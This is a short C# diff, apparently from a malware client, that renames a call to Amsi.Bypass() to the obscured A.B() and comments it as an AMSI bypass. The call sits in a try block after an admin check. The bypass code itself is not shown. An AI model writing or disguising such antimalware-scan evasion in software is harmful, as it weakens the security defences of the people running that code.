@@ -33,10 +33,7 @@ namespace Client
                 
                 if (Methods.IsAdmin())
                     Methods.ClearSetting();
-                Amsi.Bypass();
-
-
-
+                A.B();//Amsi Bypass
             }
             catch { }
 
